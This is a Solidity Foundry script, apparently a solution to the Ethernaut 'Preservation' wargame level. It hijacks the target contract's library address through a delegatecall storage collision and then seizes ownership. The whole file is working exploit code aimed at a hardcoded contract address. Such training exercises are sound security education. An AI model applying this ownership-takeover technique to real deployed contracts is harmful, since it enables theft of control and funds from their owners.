// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/16-Preservation.sol";
import "../src/16-Preservation.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Preservation preservation = Preservation(0x2b850CACe7c73b23db7eE0aEe306eC107dFF65B1);

    function run() external{
        vm.startBroadcast();
        
        // Create a contract that will be on the receiving end of `delegateCall()`
        PreservationAttacker attacker = new PreservationAttacker(0x2b850CACe7c73b23db7eE0aEe306eC107dFF65B1);

        // Call `setFirstTime()` to set `timeZone1Library` in Preservation
        preservation.setFirstTime(uint160(address(attacker)));
        require(preservation.timeZone1Library() == address(attacker));

        // Call `setFirstTime()` again which now delegates call to `PreservationAttacker`
        preservation.setFirstTime(0);
        require(preservation.owner() == msg.sender);

        vm.stopBroadcast();
    }
}